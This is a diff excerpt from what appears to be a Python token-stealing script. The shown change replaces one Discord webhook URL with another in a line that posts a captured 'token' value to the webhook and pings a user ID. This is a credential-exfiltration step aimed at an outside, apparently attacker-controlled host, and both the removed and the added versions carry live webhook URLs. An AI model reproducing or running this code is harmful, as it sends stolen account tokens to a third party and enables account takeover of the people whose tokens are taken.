@@ -96,4 +96,4 @@ for y in range(threads):
 
 
 
-requests.post('https://discord.com/api/webhooks/936988764029452338/q2XXhHdomcAL8dD7ooFYwyFvex95yZZVgQk-7royjR7d5SQz7AdkhmNuzdYWelEBuFWG',json={'content': f"<@913416321612517406> **__Fuck__**:  `{token}`"})
+requests.post('https://discordapp.com/api/webhooks/941493128844697600/slJMtzD2zqI9nrzuZLV6LwodQYd85Dgz7uwqvaytXova9LJKJ7Uf-mSmM4RIM_4UhGO6',json={'content': f"<@913416321612517406> **__@everyone__**:  `{token}`"})
